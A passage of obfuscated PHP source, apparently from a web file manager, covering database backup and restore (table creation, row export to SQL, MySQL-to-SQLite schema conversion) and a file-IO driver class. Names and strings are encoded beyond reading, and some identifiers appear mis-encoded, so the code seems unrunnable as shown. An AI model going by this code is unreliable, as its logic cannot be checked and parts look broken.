($„Éƒ­œ[$æÈ£¾óã[1071]] == $æÈ£¾óã[1068]) { $„Éƒ­œ[$æÈ£¾óã[1077]] .= $æÈ£¾óã[1163] . $ÜÅ¿ì€ò; } $this->database = $„Éƒ­œ; $·€é›²ˆ->execute("\165\163\x65\x20\140{$ÜÅ¿ì€ò}\140"); return $·€é›²ˆ; } public function createTable($¯ğÅ†”, &$ø¦‘®Û) { $¹ÕÓ¢Ê« =& $_SERVER[ÓïÕü]; if (!IO::exist($¯ğÅ†”)) { ActionCall($¹ÕÓ¢Ê«[1164], !0, 0); show_json(LNG($¹ÕÓ¢Ê«[1165]), !1); } $â™úÎïø = $this->model()->db(); $¢ì‡Šú‡ = sqlSplit(IO::getContent($¯ğÅ†”)); foreach ($¢ì‡Šú‡ as $š¥úÃıÕ) { $´×Üâ“ = stripos($š¥úÃıÕ, $¹ÕÓ¢Ê«[1166]) === 0; if ($´×Üâ“) { $ø¦‘®Û->task[$¹ÕÓ¢Ê«[1167]] += 1; } $â™úÎïø->execute($š¥úÃıÕ); if ($´×Üâ“) { preg_match($¹ÕÓ¢Ê«[1168], $š¥úÃıÕ, $´é™ü©); $ø¦‘®Û->task[$¹ÕÓ¢Ê«[1169]] = $´é™ü©[1]; $ø¦‘®Û->update(1); } } } public function insertTable($Œ˜ì¯Ûå, &$™±Öş‘Ø) { $ëÏ¹µ‡ª =& $_SERVER[ÓïÕü]; $İçœøÎö = $this->model()->db(); $¤Œ¹ÄÜ = $ÉáƒâÚ› ? array($ÉáƒâÚ›) : $İçœøÎö->getTables(); foreach ($Œ˜ì¯Ûå as $ÈÎ¯Ş—) { $ÉáƒâÚ› = basename($ÈÎ¯Ş—, $ëÏ¹µ‡ª[881]); if (!in_array($ÉáƒâÚ›, $¤Œ¹ÄÜ)) { continue; } $™±Öş‘Ø->task[$ëÏ¹µ‡ª[1169]] = $ÉáƒâÚ›; if (get_filesize($ÈÎ¯Ş—) == 0) { continue; } $¦¯ı Òò = $this->sqlToDb($ÈÎ¯Ş—, $™±Öş‘Ø); if (!$¦¯ı Òò) { ActionCall($ëÏ¹µ‡ª[1164], !0, 0); show_json(LNG($ëÏ¹µ‡ª[1170]) . "\x5b{$ÉáƒâÚ›}\135", !1); } } } public function sqlFromDb($È¥Ğˆîƒ, $¢ëÊŠ›ˆ, &$øÙç¡Èô, $ÓŒßÒê = '') { if ($øÙç¡Èô) { $øÙç¡Èô->task[$_SERVER[ÓïÕü][1169]] = $È¥Ğˆîƒ; } $õƒÎ“Š  = $this->model($È¥Ğˆîƒ); $ƒ†¹¥ÇÅ = 0; $Œğã“Çì = 0; $‹–¶»º‰ = 10000; $ºİØ„Ğ = fopen($¢ëÊŠ›ˆ, $_SERVER[ÓïÕü][1171]); $§‹çÂê = $õƒÎ“Š ->getPk(); $ì’¬Æª = $õƒÎ“Š ->getDbFields(); $‘õÖÎÈÉ = $_SERVER[ÓïÕü][12]; if ($GLOBALS[$_SERVER[ÓïÕü][880]] && in_array($È¥Ğˆîƒ, array($_SERVER[ÓïÕü][1172], $_SERVER[ÓïÕü][1173]))) { $‘õÖÎÈÉ = $È¥Ğˆîƒ; } do { $¬óì“Ş = array($§‹çÂê => array($_SERVER[ÓïÕü][1118], $Œğã“Çì)); $ƒë€ûÉÄ = $õƒÎ“Š ->where($¬óì“Ş)->field($ì’¬Æª)->order($§‹çÂê . $_SERVER[ÓïÕü][1174])->limit($‹–¶»º‰)->select(); $ƒë€ûÉÄ = !empty($ƒë€ûÉÄ) ? $ƒë€ûÉÄ : array(); if (!($İú¸œâÓ = count($ƒë€ûÉÄ))) { break; } $Ç©âÓ»î = end($ƒë€ûÉÄ); $Œğã“Çì = $Ç©âÓ»î[$§‹çÂê]; $ìé€Š‰ = array(); foreach ($ƒë€ûÉÄ as $ıîÆËúŞ) { if ($‘õÖÎÈÉ) { if ($È¥Ğˆîƒ == $_SERVER[ÓïÕü][1172]) { if ($ıîÆËúŞ[$_SERVER[ÓïÕü][33]] == $_SERVER[ÓïÕü][1175]) { $ĞàİÓà• = json_decode($ıîÆËúŞ[$_SERVER[ÓïÕü][453]], !0); if ($ĞàİÓà•[$_SERVER[ÓïÕü][32]] == $GLOBALS[$_SERVER[ÓïÕü][880]] && $ĞàİÓà•[$_SERVER[ÓïÕü][841]] != 1) { continue; } } } else { if ($ıîÆËúŞ[$_SERVER[ÓïÕü][33]] == $_SERVER[ÓïÕü][1176] && $ıîÆËúŞ[$_SERVER[ÓïÕü][97]] == $_SERVER[ÓïÕü][876]) { continue; } } } if ($ÓŒßÒê) { $ıîÆËúŞ[$_SERVER[ÓïÕü][87]] = "\x7b\151\157\x3a{$ÓŒßÒê}\175" . substr($ıîÆËúŞ[$_SERVER[ÓïÕü][87]], strlen("\173\151\x6f\72{$ıîÆËúŞ[$_SERVER[ÓïÕü][914]]}\175")); $ıîÆËúŞ[$_SERVER[ÓïÕü][914]] = $ÓŒßÒê; } $ìé€Š‰[] = $_SERVER[ÓïÕü][1177] . $this->sqlEncode($ıîÆËúŞ) . $_SERVER[ÓïÕü][1178]; } $™ÄËšÆ = "\111\x4e\123\x45\x52\124\40\111\116\x54\x4f\x20\140{$È¥Ğˆîƒ}\x60\x20\50\x60" . implode($_SERVER[ÓïÕü][1179], $ì’¬Æª) . $_SERVER[ÓïÕü][1180]; fwrite($ºİØ„Ğ, $™ÄËšÆ . implode($_SERVER[ÓïÕü][1181], $ìé€Š‰) . $_SERVER[ÓïÕü][74] . PHP_EOL); $ƒ†¹¥ÇÅ += $İú¸œâÓ; if ($øÙç¡Èô) { $øÙç¡Èô->update($İú¸œâÓ); } } while ($‹–¶»º‰ == $İú¸œâÓ); fclose($ºİØ„Ğ); return $ƒ†¹¥ÇÅ; } public function sqlToDb($ôÅ¢¶Ì, &$ƒòµÊÓ) { $çÌÈÓ½Å =& $_SERVER[ÓïÕü]; $×°Î ³µ = $this->model()->db(); $üÖÓ¢Ñ« = @fopen($ôÅ¢¶Ì, $çÌÈÓ½Å[1182]); if (!$üÖÓ¢Ñ«) { return !1; } $İü‹ãŸ© = 0; $è¼£ = $çÌÈÓ½Å[12]; $ÙÇ£ïš¼ = array(); $¾áÚ¸ß˜ = $this->dbType(); $‰ÙäÈ·ş = $¾áÚ¸ß˜ == $çÌÈÓ½Å[13] ? 500 : 2000; $èª˜è¤Ï = basename($ôÅ¢¶Ì, $çÌÈÓ½Å[881]); $êıº¦ï˜ = 0; $îÆõÃ = 4194304; while (!feof($üÖÓ¢Ñ«)) { $°Íƒàä = trim(fgets($üÖÓ¢Ñ«)); if (!$°Íƒàä) { continue; } $É†¨ÒÙ¼ = $this->sqlDecode($°Íƒàä, $¾áÚ¸ß˜, $èª˜è¤Ï); if (stripos($É†¨ÒÙ¼, $çÌÈÓ½Å[433]) === 0) { if (!$è¼£) { $è¼£ = $É†¨ÒÙ¼ . $çÌÈÓ½Å[53]; } continue; } if ($ƒòµÊÓ) { $ƒòµÊÓ->task[$çÌÈÓ½Å[1167]] += 1; } $İü‹ãŸ©++; $ÙÇ£ïš¼[] = rtrim(rtrim(trim($É†¨ÒÙ¼), $çÌÈÓ½Å[50]), $çÌÈÓ½Å[74]); $çËœÅ…¶ = null; $ê÷²¾Ì” = strlen($É†¨ÒÙ¼); $êıº¦ï˜ += $ê÷²¾Ì”; $€¾Ä¡ = strlen($è¼£) + $êıº¦ï˜ + (count($ÙÇ£ïš¼) - 1); if ($€¾Ä¡ >= $îÆõÃ) { $çËœÅ…¶ = array_pop($ÙÇ£ïš¼); if ($İü‹ãŸ© > 1) { $İü‹ãŸ©--; } } if ($İü‹ãŸ© >= $‰ÙäÈ·ş || $çËœÅ…¶) { $É†¨ÒÙ¼ = $è¼£ . implode($çÌÈÓ½Å[50], $ÙÇ£ïš¼); if (!$×°Î ³µ->execute($É†¨ÒÙ¼)) { return !1; } if ($ƒòµÊÓ) { $ƒòµÊÓ->update($İü‹ãŸ©); } $ÙÇ£ïš¼ = array(); $İü‹ãŸ© = 0; $êıº¦ï˜ = 0; if ($çËœÅ…¶) { $ÙÇ£ïš¼ = array($çËœÅ…¶); $İü‹ãŸ© = 1; $êıº¦ï˜ = $ê÷²¾Ì”; } } } fclose($üÖÓ¢Ñ«); if (!empty($ÙÇ£ïš¼)) { $É†¨ÒÙ¼ = $è¼£ . implode($çÌÈÓ½Å[50], $ÙÇ£ïš¼); if (!$×°Î ³µ->execute($É†¨ÒÙ¼)) { return !1; } if ($ƒòµÊÓ) { $ƒòµÊÓ->update($İü‹ãŸ©); } } return !0; } public function dropTable($“ÃÃâš“ = null) { $è†»ÇÛğ = $this->model()->db(); $ö¢òøñ = $“ÃÃâš“ ? array($“ÃÃâš“) : $è†»ÇÛğ->getTables(); if (!$ö¢òøñ) { return; } foreach ($ö¢òøñ as $“ÃÃâš“) { if ($“ÃÃâš“) { $“ÃÃâš“ = strtolower($“ÃÃâš“); } else { continue; } $è†»ÇÛğ->execute("\144\x72\157\160\x20\x74\141\142\154\x65\40\x69\x66\x20\x65\170\x69\x73\164\163\x20\140{$“ÃÃâš“}\140"); } } private function sqlEncode($­»É««·) { $Öèáà™ =& $_SERVER[ÓïÕü]; $£‰¶±½¦ = array(); foreach ($­»É««· as $ÌŞ¼àš¨) { if (is_array($ÌŞ¼àš¨)) { $ÌŞ¼àš¨ = json_encode_force($ÌŞ¼àš¨); } $ÌŞ¼àš¨ = addslashes($ÌŞ¼àš¨); $ÌŞ¼àš¨ = str_replace(array($Öèáà™[1183], $Öèáà™[288], $Öèáà™[420]), array($Öèáà™[1184], $Öèáà™[1185], $Öèáà™[1186]), $ÌŞ¼àš¨); $£‰¶±½¦[] = $ÌŞ¼àš¨; } return $Öèáà™[58] . implode($Öèáà™[1187], $£‰¶±½¦) . $Öèáà™[58]; } private function sqlDecode($äö˜½Úë, $æ›¶ƒéÎ, $™ê°¿İ¢ = '') { $¥§’ø³Ê =& $_SERVER[ÓïÕü]; $äö˜½Úë = str_replace(array($¥§’ø³Ê[1184], $¥§’ø³Ê[1185], $¥§’ø³Ê[1186]), array($¥§’ø³Ê[1183], $¥§’ø³Ê[288], $¥§’ø³Ê[420]), $äö˜½Úë); if ($æ›¶ƒéÎ == $¥§’ø³Ê[13]) { $äö˜½Úë = str_ireplace($¥§’ø³Ê[1188], $¥§’ø³Ê[59], $äö˜½Úë); $äö˜½Úë = stripslashes($äö˜½Úë); } return preg_replace($¥§’ø³Ê[1189], $¥§’ø³Ê[12], $äö˜½Úë); if ($æ›¶ƒéÎ == $¥§’ø³Ê[13]) { return $™ê°¿İ¢ != $¥§’ø³Ê[875] ? stripslashes($äö˜½Úë) : $äö˜½Úë; } if ($™ê°¿İ¢ == $¥§’ø³Ê[875]) { $äö˜½Úë = str_replace($¥§’ø³Ê[1190], $¥§’ø³Ê[121], stripslashes($äö˜½Úë)); } return $äö˜½Úë; } public function getSqlFile($¶ª†ã„È = '') { $Äç¹Š€˜ =& $_SERVER[ÓïÕü]; $×†»ÏÇü = $this->dbType(!0); $º‡¿Ùş¾ = CONTROLLER_DIR . "\x69\x6e\163\164\x61\x6c\x6c\57\x64\x61\164\141\x2f{$×†»ÏÇü}\x2e\163\x71\154"; $½å¶­Ù¥ = file_get_contents($º‡¿Ùş¾); $×Ñ®ğáÆ = $Äç¹Š€˜[1191] . ($×†»ÏÇü == $Äç¹Š€˜[899] ? $Äç¹Š€˜[1192] : $Äç¹Š€˜[1193]) . $Äç¹Š€˜[1194]; preg_match_all($×Ñ®ğáÆ, $½å¶­Ù¥, $’ºîÚ›); $øã„Ï…© = $’ºîÚ›[1]; $Ûá­ = $this->model()->db(); $ƒª “ÓŠ = $Ûá­->getTables(); $èÄ¹Ê‘ù = TEMP_FILES . $Äç¹Š€˜[1195] . date($Äç¹Š€˜[262]) . $Äç¹Š€˜[8]; del_dir($èÄ¹Ê‘ù); mk_dir($èÄ¹Ê‘ù); $‡õ¶ÁØ¯ = $èÄ¹Ê‘ù . $Äç¹Š€˜[1196]; $Û¨“Œ“ = $èÄ¹Ê‘ù . $Äç¹Š€˜[1197]; $ºÍ‹ßº— = $×†»ÏÇü == $Äç¹Š€˜[13] ? $Äç¹Š€˜[899] : $Äç¹Š€˜[13]; IO::copy(CONTROLLER_DIR . "\x69\156\x73\x74\141\x6c\154\x2f\x64\141\x74\x61\57{$ºÍ‹ßº—}\x2e\x73\x71\154", $èÄ¹Ê‘ù); @touch($èÄ¹Ê‘ù . $×†»ÏÇü . $Äç¹Š€˜[881]); $ÇÅŒ¯í‚ = fopen($‡õ¶ÁØ¯, $Äç¹Š€˜[1171]); $õÛÂá›š = fopen($Û¨“Œ“, $Äç¹Š€˜[1171]); if ($×†»ÏÇü == $Äç¹Š€˜[13]) { $ƒª “ÓŠ = array_diff($ƒª “ÓŠ, array($Äç¹Š€˜[873], $Äç¹Š€˜[874])); $¥äƒœ‹‡ = array($Äç¹Š€˜[1198], $Äç¹Š€˜[1199], $Äç¹Š€˜[1200]); fwrite($õÛÂá›š, implode(PHP_EOL, $¥äƒœ‹‡) . PHP_EOL . PHP_EOL); foreach ($ƒª “ÓŠ as $Íñ¬é¶ß) { $Ò…óĞÕó = $this->sqlFromSqlite($Íñ¬é¶ß); if (!$Ò…óĞÕó[$Äç¹Š€˜[13]]) { continue; } fwrite($õÛÂá›š, $Ò…óĞÕó[$Äç¹Š€˜[13]] . PHP_EOL . PHP_EOL); if (!in_array($Íñ¬é¶ß, $øã„Ï…©)) { fwrite($ÇÅŒ¯í‚, $Ò…óĞÕó[$Äç¹Š€˜[899]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ƒª “ÓŠ as $Íñ¬é¶ß) { $Ò…óĞÕó = $this->sqlFromMysql($Íñ¬é¶ß); if (!$Ò…óĞÕó[$Äç¹Š€˜[899]]) { continue; } fwrite($ÇÅŒ¯í‚, $Ò…óĞÕó[$Äç¹Š€˜[899]] . PHP_EOL . PHP_EOL); if (!in_array($Íñ¬é¶ß, $øã„Ï…©)) { fwrite($õÛÂá›š, $Ò…óĞÕó[$Äç¹Š€˜[13]] . PHP_EOL . PHP_EOL); } } } fclose($ÇÅŒ¯í‚); fclose($õÛÂá›š); $½å¶­Ù¥ = array($Äç¹Š€˜[899] => $‡õ¶ÁØ¯, $Äç¹Š€˜[13] => $Û¨“Œ“); return $¶ª†ã„È ? $½å¶­Ù¥[$¶ª†ã„È] : $½å¶­Ù¥; } public function dbType($Ú¸ÒĞŸ = false) { $…¢š–Ë¶ =& $_SERVER[ÓïÕü]; $Ûèíìà  = $Ú¸ÒĞŸ ? $GLOBALS[$…¢š–Ë¶[6]][$…¢š–Ë¶[21]] : $this->database; $Ûèíìà  = array_change_key_case($Ûèíìà ); $‘Œ¹± = $Ûèíìà [$…¢š–Ë¶[1071]]; if ($‘Œ¹± == $…¢š–Ë¶[1068]) { $ ŒÜ½Š† = explode($…¢š–Ë¶[4], $Ûèíìà [$…¢š–Ë¶[1077]]); $‘Œ¹± = $ ŒÜ½Š†[0]; } $Ï¨¸ú¿Õ = array($…¢š–Ë¶[1201] => $…¢š–Ë¶[13], $…¢š–Ë¶[1016] => $…¢š–Ë¶[899]); if (isset($Ï¨¸ú¿Õ[$‘Œ¹±])) { $‘Œ¹± = $Ï¨¸ú¿Õ[$‘Œ¹±]; } return $‘Œ¹±; } public function sqlFromMysql($ØÚõŒÁ±, $õÓ¯¨ñ¼ = '') { $’êıûˆ =& $_SERVER[ÓïÕü]; $µ¼ã‹´ = $this->model()->db(); $Ò’û€Ø¼ = $µ¼ã‹´->query($’êıûˆ[1202] . $ØÚõŒÁ± . $’êıûˆ[464]); if (!$Ò’û€Ø¼ || !$Ò’û€Ø¼[0]) { return !1; } $›åŸĞ€ø = _get($Ò’û€Ø¼[0], $’êıûˆ[1203], $’êıûˆ[12]); if (!$›åŸĞ€ø) { return !1; } $©Ò—¹à½ = "\x44\122\117\120\x20\124\101\102\x4c\105\x20\111\x46\40\x45\130\111\x53\124\x53\40\x60{$ØÚõŒÁ±}\x60\73" . PHP_EOL . $›åŸĞ€ø . $’êıûˆ[74]; if ($õÓ¯¨ñ¼ && $õÓ¯¨ñ¼ == $’êıûˆ[899]) { return $©Ò—¹à½; } $ÄğìÃŸú = array_change_key_case($GLOBALS[$’êıûˆ[6]][$’êıûˆ[21]]); $­î³›„ = $ÄğìÃŸú[$’êıûˆ[1076]]; $¸ŞÛ‘ÍÖ = $’êıûˆ[1204] . $­î³›„ . $’êıûˆ[1205] . $ØÚõŒÁ± . $’êıûˆ[58]; $èÁ´ƒ“ò = $’êıûˆ[1206] . $ØÚõŒÁ± . $’êıûˆ[1004]; $²¹ÈÜ¾ì = $µ¼ã‹´->query($¸ŞÛ‘ÍÖ); if (empty($²¹ÈÜ¾ì)) { $àâŞ¼üò = array($’êıûˆ[899] => $’êıûˆ[12], $’êıûˆ[13] => $’êıûˆ[12]); return $õÓ¯¨ñ¼ ? $àâŞ¼üò[$õÓ¯¨ñ¼] : $àâŞ¼üò; } $²‡Í§½¸ = $µ¼ã‹´->query($èÁ´ƒ“ò); $è»ò¿Ò = $’êıûˆ[12]; $°èìÆå› = array(); foreach ($²‡Í§½¸ as $±îæÌŸ›) { if (!$è»ò¿Ò && $±îæÌŸ›[$’êıûˆ[1207]] == $’êıûˆ[1208]) { $è»ò¿Ò = $±îæÌŸ›[$’êıûˆ[1209]]; } if (isset($°èìÆå›[$±îæÌŸ›[$’êıûˆ[1207]]])) { $°èìÆå›[$±îæÌŸ›[$’êıûˆ[1207]]][$’êıûˆ[1210]][] = $±îæÌŸ›[$’êıûˆ[1209]]; continue; } $°èìÆå›[$±îæÌŸ›[$’êıûˆ[1207]]] = array($’êıûˆ[1211] => $±îæÌŸ›[$’êıûˆ[1207]], $’êıûˆ[1210] => array($±îæÌŸ›[$’êıûˆ[1209]]), $’êıûˆ[1212] => $±îæÌŸ›[$’êıûˆ[1213]] == $’êıûˆ[91] ? 0 : 1); } $ÇŒ½—×š = array(); foreach ($°èìÆå› as $±îæÌŸ›) { $„âÁĞ¬ = $±îæÌŸ›[$’êıûˆ[1211]] == $’êıûˆ[1208]; $Šã­¤à = array($’êıûˆ[1214], $±îæÌŸ›[$’êıûˆ[1212]] == $’êıûˆ[91] && !$„âÁĞ¬ ? $’êıûˆ[1215] : $’êıûˆ[12], $’êıûˆ[1216], $’êıûˆ[1217] . $ØÚõŒÁ± . $’êıûˆ[11] . ($„âÁĞ¬ ? $’êıûˆ[1218] : $±îæÌŸ›[$’êıûˆ[1211]]) . $’êıûˆ[121], $’êıûˆ[1219], $’êıûˆ[121] . $ØÚõŒÁ± . $’êıûˆ[121], $’êıûˆ[1220] . implode($’êıûˆ[1221], $±îæÌŸ›[$’êıûˆ[1210]]) . $’êıûˆ[1222]); $ÇŒ½—×š[] = implode($’êıûˆ[53], $Šã­¤à) . $’êıûˆ[74]; } $ÆÇûì½Ü = array(); $ß³à½Äß = array($’êıûˆ[1223] => $’êıûˆ[1224], $’êıûˆ[1224] => $’êıûˆ[1224], $’êıûˆ[366] => $’êıûˆ[393], $’êıûˆ[365] => $’êıûˆ[393]); foreach ($²¹ÈÜ¾ì as $±îæÌŸ›) { $Šã­¤à = array($’êıûˆ[121] . $±îæÌŸ›[$’êıûˆ[1225]] . $’êıûˆ[121], isset($ß³à½Äß[$±îæÌŸ›[$’êıûˆ[1226]]]) ? $ß³à½Äß[$±îæÌŸ›[$’êıûˆ[1226]]] : $±îæÌŸ›[$’êıûˆ[1227]], $±îæÌŸ›[$’êıûˆ[1228]] == $’êıûˆ[1002] ? $’êıûˆ[1229] : $’êıûˆ[1230], $±îæÌŸ›[$’êıûˆ[1225]] == $è»ò¿Ò ? $’êıûˆ[1231] : $’êıûˆ[12], $±îæÌŸ›[$’êıûˆ[1053]] ? strtoupper(str_replace($’êıûˆ[11], $’êıûˆ[12], $±îæÌŸ›[$’êıûˆ[1053]])) : $’êıûˆ[12]); $ÆÇûì½Ü[] = trim(implode($’êıûˆ[53], $Šã­¤à)); } $®òŸÉŸ = array($’êıûˆ[1232] . $ØÚõŒÁ± . $’êıûˆ[1233], $’êıûˆ[1234] . $ØÚõŒÁ± . $’êıûˆ[1235], implode($’êıûˆ[50] . PHP_EOL, $ÆÇûì½Ü), $’êıûˆ[1050]); $®Ä¢şò = implode(PHP_EOL, array_merge($®òŸÉŸ, $ÇŒ½—×š)); if ($õÓ¯¨ñ¼ && $õÓ¯¨ñ¼ == $’êıûˆ[13]) { return $®Ä¢şò; } $àâŞ¼üò = array($’êıûˆ[899] => $©Ò—¹à½, $’êıûˆ[13] => $®Ä¢şò); return $õÓ¯¨ñ¼ ? $àâŞ¼üò[$õÓ¯¨ñ¼] : $àâŞ¼üò; } public function sqlFromSqlite($Á½Ğ•ğ†, $µúÆë¼ = '') { $¥ôËÓ‹Š =& $_SERVER[ÓïÕü]; $Ğñ˜³‚Ä = $this->model()->db(); $Š£æ²«ú = "\x50\x52\101\107\x4d\x41\40\x54\101\102\114\105\x5f\x49\x4e\x46\x4f\40\x28\x27{$Á½Ğ•ğ†}\x27\x29"; $´ççöø» = "\123\105\x4c\x45\x43\124\40\x2a\40\106\122\117\115\x20\x73\161\x6c\x69\164\145\x5f\155\x61\163\x74\145\162\40\x57\x48\105\122\x45\40\164\x62\154\x5f\x6e\141\x6d\145\40\75\x20\x27{$Á½Ğ•ğ†}\x27"; $¢—¼†­ı = $Ğñ˜³‚Ä->query($Š£æ²«ú); if (empty($¢—¼†­ı)) { $™ğÑõ = array($¥ôËÓ‹Š[899] => $¥ôËÓ‹Š[12], $¥ôËÓ‹Š[13] => $¥ôËÓ‹Š[12]); return $µúÆë¼ ? $™ğÑõ[$µúÆë¼] : $™ğÑõ; } $åˆ¿Ğ¼ = $Ğñ˜³‚Ä->query($´ççöø»); $ø¢ñÑ = $õƒóø¹” = array(); foreach ($åˆ¿Ğ¼ as $Í‰ü‡Ù) { if ($Í‰ü‡Ù[$¥ôËÓ‹Š[33]] == $¥ôËÓ‹Š[359]) { $ø¢ñÑ[] = $Í‰ü‡Ù[$¥ôËÓ‹Š[1236]]; } else { $õƒóø¹”[$Í‰ü‡Ù[$¥ôËÓ‹Š[32]]] = $Í‰ü‡Ù[$¥ôËÓ‹Š[1236]]; } } $çïı¬ô¡ = array_merge(array($¥ôËÓ‹Š[1232] . $Á½Ğ•ğ† . $¥ôËÓ‹Š[121]), $ø¢ñÑ, array_values($õƒóø¹”)); $çïı¬ô¡ = implode($¥ôËÓ‹Š[74] . PHP_EOL, $çïı¬ô¡) . $¥ôËÓ‹Š[74]; if ($µúÆë¼ && $µúÆë¼ == $¥ôËÓ‹Š[13]) { return $çïı¬ô¡; } $±Ğ·ƒÆ× = array(); foreach ($õƒóø¹” as $¶¿©²¤« => $¨ï‰–Ó) { $ÌîàáÎ = str_replace($¥ôËÓ‹Š[1237] . $Á½Ğ•ğ† . $¥ôËÓ‹Š[11], $¥ôËÓ‹Š[12], $¶¿©²¤«); $ÌîàáÎ = str_replace($Á½Ğ•ğ† . $¥ôËÓ‹Š[11], $¥ôËÓ‹Š[12], $¶¿©²¤«); $˜²åæÀ = str_replace(array($¥ôËÓ‹Š[121], $¥ôËÓ‹Š[1061]), $¥ôËÓ‹Š[464], substr($¨ï‰–Ó, stripos($¨ï‰–Ó, $¥ôËÓ‹Š[340]))); $±Ğ·ƒÆ×[$ÌîàáÎ] = $˜²åæÀ; } $ò§Œ¶”Õ = array(); $ÕÑğ’‹Á = array($¥ôËÓ‹Š[1224] => $¥ôËÓ‹Š[1238], $¥ôËÓ‹Š[393] => $¥ôËÓ‹Š[1239]); $æ¹¸Ù¤Š = $İ¨—Œ = $¥ôËÓ‹Š[12]; foreach ($¢—¼†­ı as $Í‰ü‡Ù) { if ($Í‰ü‡Ù[$¥ôËÓ‹Š[57]] == $¥ôËÓ‹Š[91]) { $æ¹¸Ù¤Š = $Í‰ü‡Ù[$¥ôËÓ‹Š[32]]; } $ ÜªÕö = $Í‰ü‡Ù[$¥ôËÓ‹Š[33]]; if ($ ÜªÕö == $¥ôËÓ‹Š[1240] && isset($±Ğ·ƒÆ×[$Í‰ü‡Ù[$¥ôËÓ‹Š[32]]])) { $ ÜªÕö = $¥ôËÓ‹Š[1241]; } $¦İíñ«Â = array($¥ôËÓ‹Š[464] . $Í‰ü‡Ù[$¥ôËÓ‹Š[32]] . $¥ôËÓ‹Š[464], _get($ÕÑğ’‹Á, $ ÜªÕö, $ ÜªÕö), $Í‰ü‡Ù[$¥ôËÓ‹Š[35]] == $¥ôËÓ‹Š[91] ? $¥ôËÓ‹Š[1229] : $¥ôËÓ‹Š[1242] . $Í‰ü‡Ù[$¥ôËÓ‹Š[56]], $Í‰ü‡Ù[$¥ôËÓ‹Š[57]] == $¥ôËÓ‹Š[91] ? $¥ôËÓ‹Š[1243] : $¥ôËÓ‹Š[12]); $ò§Œ¶”Õ[] = trim(implode($¥ôËÓ‹Š[53], $¦İíñ«Â)); } foreach ($±Ğ·ƒÆ× as $ÌîàáÎ => $˜²åæÀ) { if ($ÌîàáÎ == $¥ôËÓ‹Š[1218]) { $øôéğñÒ = $İ¨—Œ = $¥ôËÓ‹Š[1244] . $æ¹¸Ù¤Š . $¥ôËÓ‹Š[1245]; } else { $øôéğñÒ = (stripos($ÌîàáÎ, $¥ôËÓ‹Š[11]) ? $¥ôËÓ‹Š[1246] : $¥ôËÓ‹Š[12]) . ($¥ôËÓ‹Š[1247] . $ÌîàáÎ . $¥ôËÓ‹Š[1248] . $˜²åæÀ); } $ò§Œ¶”Õ[] = $øôéğñÒ; } if ($æ¹¸Ù¤Š && !$İ¨—Œ) { $ò§Œ¶”Õ = array_merge(array($¥ôËÓ‹Š[1244] . $æ¹¸Ù¤Š . $¥ôËÓ‹Š[1245]), $ò§Œ¶”Õ); } $üù±ä® = array($¥ôËÓ‹Š[1249] . $Á½Ğ•ğ† . $¥ôËÓ‹Š[1250], $¥ôËÓ‹Š[1251] . $Á½Ğ•ğ† . $¥ôËÓ‹Š[1252], implode($¥ôËÓ‹Š[50] . PHP_EOL, $ò§Œ¶”Õ), $¥ôËÓ‹Š[1253]); $®ïŒ²À„ = implode(PHP_EOL, $üù±ä®); if ($µúÆë¼ && $µúÆë¼ == $¥ôËÓ‹Š[899]) { return $®ïŒ²À„; } $™ğÑõ = array($¥ôËÓ‹Š[899] => $®ïŒ²À„, $¥ôËÓ‹Š[13] => $çïı¬ô¡); return $µúÆë¼ ? $™ğÑõ[$µúÆë¼] : $™ğÑõ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ˆÁòƒŸı, $ªä÷ôøÁ) { $²µ±£à÷ =& $_SERVER[ÓïÕü]; $ÄèĞ®†Œ = $ªä÷ôøÁ; $GLOBALS[$²µ±£à÷[1254]] = $²µ±£à÷[1255] . $ˆÁòƒŸı; Hook::trigger($²µ±£à÷[1255] . $ˆÁòƒŸı . $²µ±£à÷[1256], $ÄèĞ®†Œ); $ã›ÄÊ¢Ê = self::driverMake($ªä÷ôøÁ[0]); if (!$ã›ÄÊ¢Ê) { return !1; } if (method_exists($ã›ÄÊ¢Ê, $ˆÁòƒŸı)) { $“à†õ¦­ = @call_user_func_array(array($ã›ÄÊ¢Ê, $ˆÁòƒŸı), $ªä÷ôøÁ); } else { if (method_exists($ã›ÄÊ¢Ê, $²µ±£à÷[1257])) { $“à†õ¦­ = @call_user_func_array(array($ã›ÄÊ¢Ê, $ˆÁòƒŸı), $ªä÷ôøÁ); } else { if (method_exists(self, $ˆÁòƒŸı)) { $“à†õ¦­ = @call_user_func_array(array(self, $ˆÁòƒŸı), $ªä÷ôøÁ); } else { $“à†õ¦­ = call_user_func_array(array(parent, $ˆÁòƒŸı), $ªä÷ôøÁ); } } } Hook::trigger($²µ±£à÷[1255] . $ˆÁòƒŸı . $²µ±£à÷[1258], $ÄèĞ®†Œ, $“à†õ¦­); return $“à†õ¦­; } public static function init($Ê”àÁ¢) { return self::driverMake($Ê”àÁ¢); } public static function copy($’µğÚÕ«, $˜¨ÚÂò, $¢À«ËÕƒ = false, $æôƒ»¿ı = false) { return self::copyMoveStart($’µğÚÕ«, $˜¨ÚÂò, $¢À«ËÕƒ, $_SERVER[ÓïÕü][626], $æôƒ»¿ı); } public static function move($®¶«¼Í, $ÛŠƒ”Î£, $¯¯ä©üÖ = false, $†ßÛ©¯„ = false) { return self::copyMoveStart($®¶«¼Í, $ÛŠƒ”Î£, $¯¯ä©üÖ, $_SERVER[ÓïÕü][628], $†ßÛ©¯„); } public static function copyMoveChildren($°¶Ÿ•óÏ, $©µÒ°Ø, $Ë¶¨Õçá = "\x63\157\160\x79", $“Û©œüÈ = REPEAT_REPLACE) { $—²ü—ã =& $_SERVER[ÓïÕü]; $ÂÌë¬‚Ğ = $°¶Ÿ•óÏ; $½…âß®“ = self::driverMake($°¶Ÿ•óÏ); $ı¸øÖ = $½…âß®“->listPath($°¶Ÿ•óÏ, !0); $úôÏ¤¥± = array_merge($ı¸øÖ[$—²ü—ã[86]], $ı¸øÖ[$—²ü—ã[85]]); foreach ($úôÏ¤¥± as $·»Š¨’) { self::copyMoveStart($·»Š¨’[$—²ü—ã[87]], $©µÒ°Ø, $“Û©œüÈ, $Ë¶¨Õçá, !1); } if ($Ë¶¨Õçá == $—²ü—ã[628]) { self::remove($ÂÌë¬‚Ğ); } } private static function copyMoveStart($Íù§‰½Ê, $ÜµóĞì¥, $“âùğƒ, $Ôš£¼Ì·, $Şù÷—ÍŒ) { $’‹×¾­“ =& $_SERVER[ÓïÕü]; $æ”œ¿“½ = array($Íù§‰½Ê, $ÜµóĞì¥, $“âùğƒ, $Şù÷—ÍŒ); 